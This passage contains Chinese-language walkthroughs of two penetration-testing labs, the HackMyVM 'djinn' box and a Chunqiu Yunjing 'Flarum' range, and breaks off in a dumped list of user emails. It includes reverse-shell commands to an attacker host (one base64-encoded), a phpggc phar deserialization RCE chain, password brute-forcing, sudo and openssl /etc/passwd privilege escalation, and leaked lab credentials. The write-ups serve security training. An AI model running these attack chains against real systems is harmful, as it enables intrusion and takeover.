Stealth Scan at 04:49\nScanning 192.168.31.176 [3 ports]\nDiscovered open port 21/tcp on 192.168.31.176\nDiscovered open port 1337/tcp on 192.168.31.176\nDiscovered open port 7331/tcp on 192.168.31.176\nCompleted SYN Stealth Scan at 04:49, 0.02s elapsed (3 total ports)\nNmap scan report for 192.168.31.176\nHost is up, received arp-response (0.00032s latency).\nScanned at 2025-05-06 04:49:46 EDT for 0s\n\nPORT     STATE SERVICE REASON\n21/tcp   open  ftp     syn-ack ttl 64\n1337/tcp open  waste   syn-ack ttl 64\n7331/tcp open  swx     syn-ack ttl 64\nMAC Address: 08:00:27:36:B4:D6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nRead data files from: /usr/share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.26 seconds\n           Raw packets sent: 4 (160B) | Rcvd: 4 (160B)\n~~~\n\n# 21端口\n\n21端口可以匿名登录，里面有三个文件\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# ftp anonymous@192.168.31.176\nConnected to 192.168.31.176.\n220 (vsFTPd 3.0.3)\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n229 Entering Extended Passive Mode (|||15556|)\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt\n-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt\n-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt\n~~~\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# cat creds.txt\nnitu:81299\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# cat game.txt\noh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the\nfinal level and get the prize.\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# cat message.txt\n@nitish81299 I am going on holidays for few days, please take care of all the work.\nAnd don't mess up anything.\n~~~\n\n给了一个用户名，一个账号密码，还有一个游戏部署在1337上\n\n# 1337端口\n\nnc连接是个口算题卡，写个脚本\n\n~~~\nimport re\nimport socket\n\ndef get_question(s):\n    data = s.recv(1024).decode()\n    print(data)\n    question_re=re.search(r'(\\d.+)\\)',data)\n    if question_re:\n        question=question_re.group(1)\n        return question\n    else:\n        return None\ndef send_answer(s,answer):\n    print(answer)\n    s.sendall(answer.encode()+b'\\n')\ndef main():\n    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n    s.connect(('192.168.31.176',1337))\n    for _ in range(1,1002):\n        question=get_question(s)\n        if not question:\n            continue\n        print(question)\n        answer = str(eval(question.replace(',','').replace(\"'\",'')))\n        send_answer(s,answer)  \n    s.close()\nif __name__ == '__main__':\n    main()\n~~~\n\n会给一个`Here is your gift , I hope you know what to do with it: 1356, 6784, 3409`knock一下\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# knock 192.168.31.176 1356 6784 3409\n\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# rustscan -a 192.168.31.176 -r 1-65535\n.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.\n| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |\n| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |\n`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'\nThe Modern Day Port Scanner.\n________________________________________\n: http://discord.skerritt.blog         :\n: https://github.com/RustScan/RustScan :\n --------------------------------------\nI scanned ports so fast, even my computer was surprised.\n\n[~] The config file is expected to be at \"/root/.rustscan.toml\"\n[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 65435'.\nOpen 192.168.31.176:21\nOpen 192.168.31.176:22\nOpen 192.168.31.176:1337\nOpen 192.168.31.176:7331\n[~] Starting Script(s)\n[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-06 05:13 EDT\nInitiating ARP Ping Scan at 05:13\nScanning 192.168.31.176 [1 port]\nCompleted ARP Ping Scan at 05:13, 0.07s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 05:13\nCompleted Parallel DNS resolution of 1 host. at 05:13, 0.00s elapsed\nDNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]\nInitiating SYN Stealth Scan at 05:13\nScanning 192.168.31.176 [4 ports]\nDiscovered open port 21/tcp on 192.168.31.176\nDiscovered open port 22/tcp on 192.168.31.176\nDiscovered open port 7331/tcp on 192.168.31.176\nDiscovered open port 1337/tcp on 192.168.31.176\nCompleted SYN Stealth Scan at 05:13, 0.02s elapsed (4 total ports)\nNmap scan report for 192.168.31.176\nHost is up, received arp-response (0.00043s latency).\nScanned at 2025-05-06 05:13:30 EDT for 0s\n\nPORT     STATE SERVICE REASON\n21/tcp   open  ftp     syn-ack ttl 64\n22/tcp   open  ssh     syn-ack ttl 64\n1337/tcp open  waste   syn-ack ttl 64\n7331/tcp open  swx     syn-ack ttl 64\nMAC Address: 08:00:27:36:B4:D6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nRead data files from: /usr/share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.20 seconds\n           Raw packets sent: 5 (204B) | Rcvd: 5 (204B)\n~~~\n\n现在22端口开了，但是之前给的账号密码不对\n\n# 7331端口\n\n看看7331端口是什么，扫一下目录，能扫到一个`/wish`,是一个执行命令的地方，输入命令执行之后会跳转`http://192.168.31.176:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A`命令确实是执行了，反弹个shell\n\n~~~\necho YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjEyOS80NDQ0IDA+JjE=|base64 -d |bash\n~~~\n\n# 提权SAM\n\n在/home/nitish/.dev下有一个凭证\n\n~~~\nwww-data@djinn:/home/nitish/.dev$ cat creds.txt\nnitish:p4ssw0rdStr3r0n9\n~~~\n\n~~~\nnitish@djinn:~$ sudo -l\nMatching Defaults entries for nitish on djinn:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser nitish may run the following commands on djinn:\n    (sam) NOPASSWD: /usr/bin/genie\n~~~\n\n~~~\nnitish@djinn:~$ sudo -u sam /usr/bin/genie -c '/bin/sh'\nPass your wish to GOD, he might be able to help you.\n~~~\n\n哈哈哈哈 -c不行，看看其他参数，man手册里还有一个-cmd的参数\n\n~~~\nnitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd id\nmy man!!\n$ \n~~~\n\n# 提权ROOT\n\n~~~\nsam@djinn:~$ sudo -l\nMatching Defaults entries for sam on djinn:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser sam may run the following commands on djinn:\n    (root) NOPASSWD: /root/lago\n~~~\n\nsam的家目录下有一个.pyc,进行反编译\n\n~~~\n#!/usr/bin/env python\n# visit https://tool.lu/pyc/ for more information\n# Version: Python 2.7\n\nfrom getpass import getuser\nfrom os import system\nfrom random import randint\n\ndef naughtyboi():\n    print 'Working on it!! '\n\n\ndef guessit():\n    num = randint(1, 101)\n    print 'Choose a number between 1 to 100: '\n    s = input('Enter your number: ')\n    if s == num:\n        system('/bin/sh')\n    else:\n        print 'Better Luck next time'\n\n\ndef readfiles():\n    user = getuser()\n    path = input('Enter the full of the file to read: ')\n    print 'User %s is not allowed to read %s' % (user, path)\n\n\ndef options():\n    print 'What do you want to do ?'\n    print '1 - Be naughty'\n    print '2 - Guess the number'\n    print '3 - Read some damn files'\n    print '4 - Work'\n    choice = int(input('Enter your choice: '))\n    return choice\n\n\ndef main(op):\n    if op == 1:\n        naughtyboi()\n    elif op == 2:\n        guessit()\n    elif op == 3:\n        readfiles()\n    elif op == 4:\n        print 'work your ass off!!'\n    else:\n        print 'Do something better with your life'\n\nif __name__ == '__main__':\n    main(options())\n\n~~~\n\n可以直接传入一个num，他会将你传入的num解析成变量就可以通过了，或者就爆破我就不试了\n\n~~~\nsam@djinn:/home/sam$ sudo /root/lago\nWhat do you want to do ?\n1 - Be naughty\n2 - Guess the number\n3 - Read some damn files\n4 - Work\nEnter your choice:2\nChoose a number between 1 to 100:\nEnter your number: num\n# id\nuid=0(root) gid=0(root) groups=0(root)\n~~~\n\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"春秋云镜-Flarum","url":"/2025/05/05/春秋云镜-Flarum/","content":"\n\n\n# FLAG01\n\nfscan 先扫描一下\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# ../pentest/fscan/fscan2 -h 39.98.127.236\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     _ __  __ _ _ __ __ _  _ __| | __    │\n│  / /_\\/____/ _ _|/ _ _| '_ _/ _` |/ __| |/ /    │\n│ / /_\\\\_ ____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\_ _,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-05-04 22:56:34] [INFO] 暴力破解线程数: 1\n[2025-05-04 22:56:34] [INFO] 开始信息扫描\n[2025-05-04 22:56:34] [INFO] 最终有效主机数量: 1\n[2025-05-04 22:56:34] [INFO] 开始主机扫描\n[2025-05-04 22:56:34] [INFO] 有效端口数量: 233\n[2025-05-04 22:56:34] [SUCCESS] 端口开放 39.98.127.236:22\n[2025-05-04 22:56:34] [SUCCESS] 端口开放 39.98.127.236:80\n[2025-05-04 22:56:34] [SUCCESS] 服务识别 39.98.127.236:22 => [ssh] 版本: 8.9p1 Ubuntu 3ubuntu0.3 产品: OpenSSH 系统: Linux 信息: Ubuntu Linux; protocol 2.0 Banner: [SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.3.]\n[2025-05-04 22:56:41] [SUCCESS] 服务识别 39.98.127.236:80 => [http]\n[2025-05-04 22:56:43] [INFO] 存活端口数量: 2\n[2025-05-04 22:56:43] [INFO] 开始漏洞扫描\n[2025-05-04 22:56:43] [INFO] 加载的插件: ssh, webpoc, webtitle\n[2025-05-04 22:56:43] [SUCCESS] 网站标题 http://39.98.127.236      状态码: 200 长度: 5882   标题: 霄壤社区\n[2025-05-04 22:56:56] [SUCCESS] 扫描已完成: 3/3\n~~~\n\n页面上给了一个邮箱 `administrator@xiaorang.lab` 很明显就是管理员的邮箱，然后爆破密码得到 `1chris`\n\n后台管理显示框架是 `Flarum 1.6.0`\n\n[参考文章](https://www.leavesongs.com/PENETRATION/flarum-rce-tour.html)\n\n首先下载一个 [phpggc](https://github.com/ambionics/phpggc#) 然后生成一个反弹 shell 的语句\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp/phpggc]\n└─# ./phpggc -p tar -b Monolog/RCE6 system \"bash -c 'bash -i >& /dev/tcp/VPS/PORT 0 >&1'\"\n~~~\n\n然后在后台外观-> 自定义样式里面添加\n\n~~~\n@import (inline) 'data:text/css;base64,xxx';\n~~~\n\n访问 URL/assets/forum.css, 可以看到我们的反弹 shell 的语句已经被写进去了\n\n然后在自定义样式里面修改成\n\n~~~\n.test {\n  content: data-uri(\"phar://./assets/forum.css\");\n}\n~~~\n\n然后保存，shell 就被弹出来了，然后开始提权\n\n~~~\nwww-data@web01:/$ getcap -r / 2 >/dev/null\n/snap/core20/1974/usr/bin/ping cap_net_raw = ep\n/snap/core20/1405/usr/bin/ping cap_net_raw = ep\n/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service, cap_net_admin = ep\n/usr/bin/openssl = ep\n/usr/bin/mtr-packet cap_net_raw = ep\n/usr/bin/ping cap_net_raw = ep\n~~~\n\n可以看到 openssl 具有 sgid 的权限，写文件提权！\n\n~~~\nwww-data@web01:/tmp$ cat passwd \nroot: x: 0:0: root:/root:/bin/bash\ndaemon: x: 1:1: daemon:/usr/sbin:/usr/sbin/nologin\nbin: x: 2:2: bin:/bin:/usr/sbin/nologin\nsys: x: 3:3: sys:/dev:/usr/sbin/nologin\nsync: x: 4:65534: sync:/bin:/bin/sync\ngames: x: 5:60: games:/usr/games:/usr/sbin/nologin\nman: x: 6:12: man:/var/cache/man:/usr/sbin/nologin\nlp: x: 7:7: lp:/var/spool/lpd:/usr/sbin/nologin\nmail: x: 8:8: mail:/var/mail:/usr/sbin/nologin\nnews: x: 9:9: news:/var/spool/news:/usr/sbin/nologin\nuucp: x: 10:10: uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy: x: 13:13: proxy:/bin:/usr/sbin/nologin\nwww-data: x: 33:33: www-data:/var/www:/usr/sbin/nologin\nbackup: x: 34:34: backup:/var/backups:/usr/sbin/nologin\nlist: x: 38:38: Mailing List Manager:/var/list:/usr/sbin/nologin\nirc: x: 39:39: ircd:/run/ircd:/usr/sbin/nologin\ngnats: x: 41:41: Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody: x: 65534:65534: nobody:/nonexistent:/usr/sbin/nologin\n_apt: x: 100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network: x: 101:102: systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve: x: 102:103: systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus: x: 103:104::/nonexistent:/usr/sbin/nologin\nsystemd-timesync: x: 104:105: systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\npollinate: x: 105:1::/var/cache/pollinate:/bin/false\nsshd: x: 106:65534::/run/sshd:/usr/sbin/nologin\nsyslog: x: 107:113::/home/syslog:/usr/sbin/nologin\nuuidd: x: 108:114::/run/uuidd:/usr/sbin/nologin\ntcpdump: x: 109:115::/nonexistent:/usr/sbin/nologin\ntss: x: 110:116: TPM software stack,,,:/var/lib/tpm:/bin/false\nlandscape: x: 111:117::/var/lib/landscape:/usr/sbin/nologin\nusbmux: x: 112:46: usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nlxd: x: 999:100::/var/snap/lxd/common/lxd:/bin/false\nntp: x: 113:118::/nonexistent:/usr/sbin/nologin\n_chrony: x: 114:124: Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin\nfwupd-refresh: x: 115:125: fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\nmysql: x: 116:127: MySQL Server,,,:/nonexistent:/bin/false\nll: $1$ Zg12rJZk$P7IV1RqAT005RKjprDSo41:0:0: root:/root:/bin/bash\nwww-data@web01:/tmp$ cat passwd |openssl enc -out /etc/passwd\nwww-data@web01:/tmp$ su - ll\nPassword: \nroot@web01:~# \n~~~\n\nflag 在/root 下\n\n# FLAG03\n\n上传 fscan 再做一个代理，fscan 扫！\n\n~~~\nroot@web01:~# ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 :: 1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e: 32:30: a9 brd ff: ff: ff: ff: ff: ff\n    altname enp0s5\n    altname ens5\n    inet 172.22.60.52/16 metric 100 brd 172.22.255.255 scope global dynamic eth0\n       valid_lft 315359312sec preferred_lft 315359312sec\n    inet6 fe80:: 216:3eff: fe32:30a9/64 scope link\n       valid_lft forever preferred_lft forever\nroot@web01:~# ./fscan2 -h  172.22.60.52/24\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     _ __  __ _ _ __ __ _  _ __| | __    │\n│  / /_\\/____/ _ _|/ _ _| '_ _/ _` |/ __| |/ /    │\n│ / /_\\\\_ ____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\_ _,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-05-05 11:28:42] [INFO] 暴力破解线程数: 1\n[2025-05-05 11:28:42] [INFO] 开始信息扫描\n[2025-05-05 11:28:42] [INFO] CIDR 范围: 172.22.60.0-172.22.60.255\n[2025-05-05 11:28:42] [INFO] 生成 IP 范围: 172.22.60.0.%! d(string = 172.22.60.255) - %! s(MISSING).%! d(MISSING)\n[2025-05-05 11:28:42] [INFO] 解析 CIDR 172.22.60.52/24 -> IP 范围 172.22.60.0-172.22.60.255\n[2025-05-05 11:28:42] [INFO] 最终有效主机数量: 256\n[2025-05-05 11:28:42] [INFO] 开始主机扫描\n[2025-05-05 11:28:42] [SUCCESS] 目标 172.22.60.52    存活 (ICMP)\n[2025-05-05 11:28:42] [SUCCESS] 目标 172.22.60.8     存活 (ICMP)\n[2025-05-05 11:28:42] [SUCCESS] 目标 172.22.60.15    存活 (ICMP)\n[2025-05-05 11:28:42] [SUCCESS] 目标 172.22.60.42    存活 (ICMP)\n[2025-05-05 11:28:45] [INFO] 存活主机数量: 4\n[2025-05-05 11:28:45] [INFO] 有效端口数量: 233\n[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.8:88\n[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.8:389\n[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.42:139\n[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.15:139\n[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.8:139\n[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.42:135\n[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.15:135\n[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.8:135\n[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.42:445\n[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.15:445\n[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.8:445\n[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.52:22\n[2025-05-05 11:28:45] [SUCCESS] 端口开放 172.22.60.52:80\n[2025-05-05 11:28:46] [SUCCESS] 服务识别 172.22.60.52:22 => [ssh] 版本: 8.9p1 Ubuntu 3ubuntu0.3 产品: OpenSSH 系统: Linux  信息: Ubuntu Linux; protocol 2.0 Banner: [SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.3.]\n[2025-05-05 11:28:50] [SUCCESS] 服务识别 172.22.60.8:88 =>\n[2025-05-05 11:28:50] [SUCCESS] 服务识别 172.22.60.42:139 =>  Banner: [.]\n[2025-05-05 11:28:50] [SUCCESS] 服务识别 172.22.60.8:389 =>\n[2025-05-05 11:28:50] [SUCCESS] 服务识别 172.22.60.15:139 =>  Banner: [.]\n[2025-05-05 11:28:50] [SUCCESS] 服务识别 172.22.60.8:139 =>  Banner: [.]\n[2025-05-05 11:28:51] [SUCCESS] 服务识别 172.22.60.42:445 =>\n[2025-05-05 11:28:51] [SUCCESS] 服务识别 172.22.60.15:445 =>\n[2025-05-05 11:28:51] [SUCCESS] 服务识别 172.22.60.8:445 =>\n[2025-05-05 11:28:51] [SUCCESS] 服务识别 172.22.60.52:80 => [http]\n[2025-05-05 11:29:50] [SUCCESS] 服务识别 172.22.60.42:135 =>\n[2025-05-05 11:29:50] [SUCCESS] 服务识别 172.22.60.15:135 =>\n[2025-05-05 11:29:51] [SUCCESS] 服务识别 172.22.60.8:135 =>\n[2025-05-05 11:29:51] [INFO] 存活端口数量: 13\n[2025-05-05 11:29:51] [INFO] 开始漏洞扫描\n[2025-05-05 11:29:51] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle\n[2025-05-05 11:29:51] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.60.8\n主机名: DC\n发现的网络接口:\n   IPv4 地址:\n      └─ 172.22.60.8\n      └─ 169.254.24.199\n[2025-05-05 11:29:51] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.60.15\n主机名: PC1\n发现的网络接口:\n   IPv4 地址:\n      └─ 172.22.60.15\n      └─ 169.254.125.121\n[2025-05-05 11:29:51] [SUCCESS] NetBios 172.22.60.42    XIAORANG\\FILESERVER\n[2025-05-05 11:29:51] [SUCCESS] NetBios 172.22.60.15    XIAORANG\\PC1\n[2025-05-05 11:29:51] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.60.42\n主机名: Fileserver\n发现的网络接口:\n   IPv4 地址:\n      └─ 172.22.60.42\n      └─ 169.254.128.155\n[2025-05-05 11:29:51] [SUCCESS] NetBios 172.22.60.8     DC: XIAORANG\\DC\n[2025-05-05 11:29:51] [SUCCESS] 网站标题 http://172.22.60.52       状态码: 200 长度: 5867   标题: 霄壤社区\n~~~\n\n~~~\nroot@web01:/var/www/html# cat config.php\n<?php return array (\n  'debug' => false,\n  'database' =>\n  array (\n    'driver' => 'mysql',\n    'host' => 'localhost',\n    'port' => 3306,\n    'database' => 'flarum',\n    'username' => 'root',\n    'password' => 'Mysql@root123',\n    'charset' => 'utf8mb4',\n    'collation' => 'utf8mb4_unicode_ci',\n    'prefix' => 'flarum_',\n    'strict' => false,\n    'engine' => 'InnoDB',\n    'prefix_indexes' => true,\n  ),\n  'url' => 'http://'.$_SERVER['HTTP_HOST'],\n  'paths' =>\n  array (\n    'api' => 'api',\n    'admin' => 'admin',\n  ),\n  'headers' =>\n  array (\n    'poweredByHeader' => true,\n    'referrerPolicy' => 'same-origin',\n  ),\n);\n~~~\n\n拿到数据库的用户名和密码了，进行一波信息搜集\n\n~~~\nmysql > select email from flarum_users;\n+----------------------------+\n| email                      |\n+----------------------------+\n| administrator@xiaorang.lab |\n| chenbin@xiaorang.lab       |\n| chenbo@xiaorang.lab        |\n| chenchao@xiaorang.lab      |\n| chenchen@xiaorang.lab      |\n| chenfang@xiaorang.lab      |\n| chenhong@xiaorang.lab      |\n| chenhua@xiaorang.lab       |\n| chenjie@xiaorang.lab       |\n| chenjing@xiaorang.lab      |\n| chenjuan@xiaorang.lab      |\n| chenjun@xiaorang.lab       |\n| chenlei@xiaorang.lab       |\n| chenli@xiaorang.lab        |\n| chenlin@xiaorang.lab       |\n| chenling@xiaorang.lab      |\n| chenlong@xiaorang.lab      |\n| chenmin@xiaorang.lab       |\n| chenpeng@xiaorang.lab      |\n| chenping@xiaorang.lab      |\n| chenqiang@xiaorang.lab     |\n| chentao@xiaorang.lab       |\n| chenwei@xiaorang.lab       |\n| chenyan@xiaorang.lab       |\n| chenying@xiaorang.lab      |\n| chenyong@xiaorang.lab      |\n| chenyun@xiaorang.lab       |\n| gaofeng@xiaorang.lab       |\n| huangmin@xiaorang.lab      |\n| huangyong@xiaorang.lab     |\n| libin@xiaorang.lab         |\n| libing@xiaorang.lab        |\n| libo@xiaorang.lab          |\n| lichao@xiaorang.lab        |\n| lidan@xiaorang.lab         |\n| lifang@xiaorang.lab        |\n| lifeng@xiaorang.lab        |\n| ligang@xiaorang.lab        |\n| lihao@xiaorang.lab         |\n| lihong@xiaorang.lab        |\n| lihua@xiaorang.lab         |\n| lijia@xiaorang.lab         |\n| lijian@xiaorang.lab        |\n| lijie@xiaorang.lab         |\n| lijing@xiaorang.lab        |\n| lijuan@xiaorang.lab        |\n| lijun@xiaorang.lab         |\n| likai@xiaorang.lab         |\n| lilei@xiaorang.lab         |\n| lili@xiaorang.lab          |\n| liliang@xiaorang.lab       |\n| lilin@xiaorang.lab         |\n| liling@xiaorang.lab        |\n| lilong@xiaorang.lab        |\n| limin@xiaorang.lab         |\n| liming@xiaorang.lab        |\n| lina@xiaorang.lab          |\n| lining@xiaorang.lab        |\n| lipeng@xiaorang.lab        |\n| liping@xiaorang.lab        |\n| liqian@xiaorang.lab        |\n| liqiang@xiaorang.lab       |\n| liqin@xiaorang.lab         |\n| lishuai@xiaorang.lab       |\n| litao@xiaorang.lab         |\n| liubin@xiaorang.lab        |\n| liubing@xiaorang.lab       |\n| liuchang@xiaorang.lab      |\n| liuchao@xiaorang.lab       |\n| liudan@xiaorang.lab        |\n| liufang@xiaorang.lab       |\n| liufei@xiaorang.lab        |\n| liufeng@xiaorang.lab       |\n| liugang@xiaorang.lab       |\n| liuhao@xiaorang.lab        |\n| liuhua@xiaorang.lab        |\n| liuhuan@xiaorang.lab       |\n| liuhui@xiaorang.lab        |\n| liujia@xiaorang.lab        |\n| liujing@xiaorang.lab       |\n| liujun@xiaorang.lab        |\n| liukai@xiaorang.lab        |\n| liulei@xiaorang.lab        |\n| liuli@xiaorang.lab         |\n| liuling@xiaorang.lab       |\n| liumei@xiaorang.lab        |\n| liumin@xiaorang.lab        |\n| liuming@xiaorang.lab       |\n| liuna@xiaorang.lab         |\n| liupeng@xiaorang.lab       |\n| liuping@xiaorang.lab       |\n| liuqian@xiaorang.lab       |\n| liuqiang@xiaorang.lab      |\n| liuqin@xiaorang.lab        |\n| liushuai@xiaorang.lab      |\n| liutao@xiaorang.lab        |\n| liuwei@xiaorang.lab        |\n| liuxia@xiaorang.lab        |\n| liuxin@xiaorang.lab        |\n| liuyan@xiaorang.lab        |\n| liuying@xiaorang.lab       |\n| liuyong@xiaorang.lab       |\n| liuyun@xiaorang.lab        |\n| liwei@xiaorang.lab         |\n| liwen@xiaorang.lab         |\n| lixiang@xiaorang.lab       |\n| lixin@xiaorang.lab         |\n| lixue@xiaorang.lab         |\n| liyan@xiaorang.lab         |\n| liyang@xiaorang.lab        |\n| liying@xiaorang.lab        |\n| liyong@xiaorang.lab        |\n| liyun@xiaorang.lab         |\n| machao@xiaorang.lab        |\n| sunwei@xiaorang.lab        |\n| wangbin@xiaorang.lab       |\n| wangbing@xiaorang.lab      |\n| wangbo@xiaorang.lab        |\n| wangchao@xiaorang.lab      |\n| wangcheng@xiaorang.lab     |\n| wangdan@xiaorang.lab       |\n| wangdong@xiaorang.lab      |\n| wangfang@xiaorang.lab      |\n| wanggang@xiaorang.lab      |\n| wanghao@xiaorang.lab       |\n| wanghua@xiaorang.lab       |\n| wanghuan@xiaorang.lab      |\n| wanghui@xiaorang.lab       |\n| wangjian@xiaorang.lab      |\n| wangjing@xiaorang.lab      |\n| wangjuan@xiaorang.lab      |\n| wangkai@xiaorang.lab       |\n| wangkun@xiaorang.lab       |\n| wanglei@xiaorang.lab       |\n| wangli@xiaorang.lab        |\n| wangliang@xiaorang.lab     |\n| wanglin@xiaorang.lab       |\n| wangling@xiaorang.lab      |\n| wanglong@xiaorang.lab      |\n| wanglu@xiaorang.lab        |\n| wangmei@xiaorang.lab       |\n| wangmin@xiaorang.lab       |\n| wangming@xiaorang.lab      |\n| wangna@xiaorang.lab        |\n| wangning@xiaorang.lab      |\n| wangping@xiaorang.lab      |\n| wangqian@xiaorang.lab      |\n| wangqiang@xiaorang.lab     |\n| wangqin@xiaorang.lab       |\n| wangrong@xiaorang.lab      |\n| wangrui@xiaorang.lab       |\n| wangtao@xiaorang.lab       |\n| wangting@xiaorang.lab      |\n| wangwei@xiaorang.lab       |\n| wangxia@xiaorang.lab       |\n| wangxin@xiaorang.lab       |\n| wangxu@xiaorang.lab        |\n| wangxue@xiaorang.lab       |\n| wangyan@xiaorang.lab       |\n| wangying@xiaorang.lab      |\n| wangyong@xiaorang.lab      |\n| wangyu@xiaorang.lab        |\n| wangyun@xiaorang.lab       |\n| xumin@xiaorang.lab         |\n| xuwei@xiaorang.lab         |\n| yangbin@xiaorang.lab       |\n| yangbo@xiaorang.lab        |\n| yangchao@xiaorang.lab      |\n| yangfang@xiaorang.lab      |\n| yanghong@xiaorang.lab      |\n| yanghua@xiaorang.lab       |\n| yangjie@xiaorang.lab       |\n| yangjing@xiaorang.lab      |\n| yangjuan@xiaorang.lab      |\n| yangjun@xiaorang.lab       |\n| yangli@xiaorang.lab        |\n| yanglin@xiaorang.lab       |\n| yangling@xiaorang.lab      |\n| yangliu@xiaorang.lab       |\n| yangmei@xiaorang.lab       |\n| yangming@xiaorang.lab      |\n| yangping@xiaorang.lab      |\n| yangtao@xiaorang.lab       |\n| yangwei@xiaorang.lab       |\n| yangxue@xiaorang.lab       |\n| yangyan@xiaorang.lab       |\n| yangyang@xiaorang.lab      |\n| yangyong@xiaorang.lab      |\n| zhangbin@xiaorang.lab      |\n| zhangbo@xiaorang.lab       |\n| zhangchao@xiaorang.lab     |\n| zhangdan@xiaorang.lab      |\n| zhangfan@xiaorang.lab      |\n| zhangfei@xiaorang.lab      |\n| zhangfeng@xiaorang.lab     |\n| zhanghao@xiaorang.lab      |\n| zhanghong@xiaorang.lab     |\n| zhanghua@xiaorang.lab      |\n| zhanghui@xiaorang.lab      |\n| zhangjian@xiaorang.lab     |\n| zhangjie@xiaorang.lab      |\n| zhangjing@xiaorang.lab     |\n| zhangjun@xiaorang.lab      |\n| zhanglei@xiaorang.lab      |\n| zhangli@xiaorang.lab       |\n| zhangliang@xiaorang.lab    |\n| zhanglin@xiaorang.lab      |\n| zhangling@xiaorang.lab     |\n| zhanglong@xiaorang.lab     |\n| zhangmei@xiaorang.lab      |\n| zhangmin@xiaorang.lab      |\n| zhangming@xiaorang.lab     |\n| zhangnan@xiaorang.lab      |\n| zhangning@xiaorang.lab     |\n| zhangpeng@xiaorang.lab     |\n| zhangping@xiaorang.lab     |\n| zhangqian@xiaorang.lab     |\n| zhangqiang@xiaorang.lab    |\n| zhangqin@xiaorang.lab      |\n| zhangrong@xiaorang.lab     |\n| 